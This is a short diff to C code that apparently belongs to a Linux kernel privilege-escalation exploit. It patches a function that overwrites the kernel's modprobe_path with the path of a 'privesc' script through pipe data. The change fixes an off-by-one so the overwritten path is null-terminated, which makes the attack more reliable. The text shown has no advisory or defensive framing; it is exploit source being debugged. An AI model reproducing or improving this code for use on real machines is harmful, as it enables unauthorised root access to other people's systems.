@@ -249,7 +249,7 @@ int find_and_change_modprobe_path(char *pipe_data, char *modprobe_path, char *pr
 {
 	size_t modprobe_path_len = strlen(modprobe_path);
 	unsigned long modprobe_path_start = MODPROBE_PATH_VADDR & (PAGE_SIZE - 1);
-	size_t privesc_script_path_len = strlen(privesc_script_path);
+	size_t privesc_script_path_len = strlen(privesc_script_path) + 1;
 	int ret = -1;
 
 	assert(modprobe_path_start + modprobe_path_len < PAGE_SIZE);
@@ -257,7 +257,7 @@ int find_and_change_modprobe_path(char *pipe_data, char *modprobe_path, char *pr
 	if (ret != 0)
 		return EXIT_FAILURE;
 
-	assert(modprobe_path_start + privesc_script_path_len < PAGE_SIZE);
+	assert(modprobe_path_start + privesc_script_path_len <= PAGE_SIZE);
 	strncpy(pipe_data + modprobe_path_start, privesc_script_path, privesc_script_path_len);
 	return EXIT_SUCCESS;
 }
